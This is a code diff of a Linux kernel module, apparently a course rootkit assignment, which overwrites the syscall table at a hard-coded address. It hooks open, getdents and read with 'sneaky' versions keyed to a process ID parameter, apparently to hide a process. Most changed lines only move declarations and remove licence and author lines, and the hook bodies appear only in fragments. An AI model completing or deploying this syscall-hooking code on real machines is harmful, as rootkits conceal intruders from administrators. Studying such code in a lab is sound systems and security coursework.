@@ -9,9 +9,6 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Kaidi Lyu");
-
 static int pid;
 module_param(pid, int, 0);
 MODULE_PARM_DESC(pid, "Sneaky process ID");
@@ -63,6 +60,8 @@ static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00280;
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
@@ -80,8 +79,6 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 }
 
 // Define our new sneaky version of the "getdents" syscall
-asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
     int originalRes = original_getdents(fd, dirp, count);
@@ -106,8 +103,6 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 }
 
 // Define our new sneaky version of the "read" syscall
-asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
-
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
 {
     ssize_t originalRes = original_read(fd, buf, count);
@@ -194,4 +189,3 @@ static void exit_sneaky_module(void)
 
 module_init(initialize_sneaky_module); // what's called upon loading
 module_exit(exit_sneaky_module);       // what's called upon unloading
-//MODULE_LICENSE("GPL");
